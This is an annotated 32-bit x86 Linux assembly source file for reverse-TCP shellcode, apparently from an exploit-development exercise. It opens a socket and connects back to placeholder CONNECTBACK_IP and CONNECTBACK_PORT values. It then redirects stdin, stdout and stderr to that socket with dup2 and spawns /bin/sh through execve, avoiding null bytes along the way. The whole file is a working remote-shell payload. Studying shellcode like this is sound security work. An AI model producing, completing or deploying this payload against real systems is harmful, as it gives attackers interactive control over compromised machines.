BITS 32

global _start

_start:
    ;    =============================== SOCKET =====================================
    ;    socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 3
    ;
    ;    int socket(int domain, int type, int protocol);
    ;
    ;    int socketcall(int call, unsigned long *args)
    ;    socketcall    SYS_SOCKET      socket() args
    ;    EAX           EBX             ECX
    ;    102           1               (2, 1, 6)
    ;
    ;    SYS_SOCKET will return file descriptor (fd) in EAX.

    ; EAX
    xor eax, eax
    mov al, 102             ; socketcall

    ; EBX
    xor ebx, ebx
    mov bl, 1               ; SYS_SOCKET socket()

    ; ECX
    xor ecx, ecx
    push ecx
    push BYTE 6             ; IPPROTO_TCP   ||      int protocol);
    push BYTE 1             ; SOCK_STREAM   ||      int type,
    push BYTE 2             ; AF_INET       || socket(int domain,
    mov ecx, esp            ; ECX - PTR to arguments for socket()
    int 0x80                ; sockfd will be stored in EAX after this call

    ; EAX return
    mov esi, eax            ; save socket fd in ESI for later

    ;
    ; =============================== CONNECT =====================================
    ;
    ; connect(
    ;   3,
    ;   {sa_family=AF_INET, sin_port=htons(12357), sin_addr=inet_addr("127.0.0.1")},
    ;   16
    ; ) = -1 EINPROGRESS (Operation now in progress)
    ;
    ; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
    ;

    jmp short call_get_ip_and_port

back2shellcode:
    pop edi                 ; getting ip and port address from ESP

    ; EAX
    xor eax, eax
    mov al, 102             ; socketcall

    ; EBX
    xor ebx, ebx
    mov bl, 3               ; SYS_CONNECT connect()

    ; ECX
    xor edx, edx
    ;    push edx                ; 0.0.0.0 - ALL interfaces
    ;    push DWORD 0x0100007f   ; 127.0.0.1 in reverse  *** CONTAINS NULLs ! ***
    ;    push DWORD 0x0101a8c0   ; 192.168.1.1 in reverse
    push DWORD [edi]    ; push IP
    push WORD [edi+0x4] ; push port
    dec ebx                     ; decrease bl from 3 to 2 to use it in the next push
    push WORD bx                ; 2 - AF_INET
    inc ebx                     ; put back bl to 3 for SYS_CONNECT
    mov ecx, esp                ; ptr to struct sockaddr

    push BYTE 16                ;   socklen_t addrlen);
    push ecx                    ;   const struct sockaddr *addr,
    push esi                    ; connect(int sockfd,
    mov ecx, esp                ; ECX = PTR to arguments for connect()
    int 0x80                    ; sockfd will be in EBX

    ;
    ; =============================== DUP FD =====================================
    ;
    ; Before we spawn a shell, we need to forward all I/O (stdin,stdout,stderr)
    ; to a client. For this, we can dup2 syscall to duplicate a file descriptor.
    ; man 2 dup2
    ; int dup2(int oldfd,           int newfd);
    ; EAX,          EBX,            ECX
    ; 63            sockfd          0
    ; 63            sockfd          1
    ; 63            sockfd          2
    ;

    ; move our sockfd to EAX
    mov eax, ebx

    xor eax, eax
    mov al, 63              ; dup2 syscall
    xor ecx, ecx            ; 0 - stdin
    int 0x80                ; call dup2(sockfd, 0)

    mov al, 63              ; dup2 syscall
    mov cl, 1               ; 1 - stdout
    int 0x80                ; call dup2(sockfd, 1)

    mov al, 63              ; dup2 syscall
    mov cl, 2               ; 2 - stderr
    int 0x80                ; call dup2(sockfd, 2)

    ;
    ; =============================== EXECVE =====================================
    ;
    ; Now as we forwarded sockfd to a client, we can spawn shell.
    ; Prepare the path, in little-endian, using the Python
    ; >>> '//bin/sh'[::-1].encode('hex')
    ; '68732f6e69622f2f'
    ;
    ; int execve(const char *filename, char *const argv[], char *const envp[]);
    ; EAX           EBX,                    ECX,            EDX
    ; 11            '//bin/sh'              PTR to EBX      NULL

    ; EAX
    xor eax, eax
    mov al, 11              ; execve syscall

    ; EBX
    xor edx, edx
    push edx                ; NULL termination of '//bin/sh' string
    push 0x68732f6e         ; '//bin/sh' in reverse
    push 0x69622f2f         ; beginning of '//bin/sh' string is here
    mov ebx, esp            ; put the address of '//bin/sh' into ebx via esp

    ; ECX
    push edx                ; NULL termination of a stack
    push ebx                ; load our '//bin/sh' on a stack
    mov ecx, esp            ; ECX is a PTR to stack where we've got EBX address to '//bin/sh' string.

    ; EDX
    push edx                ; NULL terminator
    mov edx, esp            ; EDX is a PTR to a stack which has an address to NULL.
    int 0x80                ; call execve(EBX, ECX, EDX)

call_get_ip_and_port:
    call back2shellcode

    ;    dd 0x0101a8c0                  ; Example: DWORD 192.168.1.1 reverse (in hex)
    ;    db 0xc0, 0xa8, 0x01, 0x01      ; Example: BYTE 192.168.1.1 straight (in hex)
    dd 0xCONNECTBACK_IP

    ;    dw 0x4530                      ; Example: WORD 12357 reverse (in hex)
    ;    db 0x30, 0x45                  ; Example: BYTE 12357 straight (in hex)
    dw 0xCONNECTBACK_PORT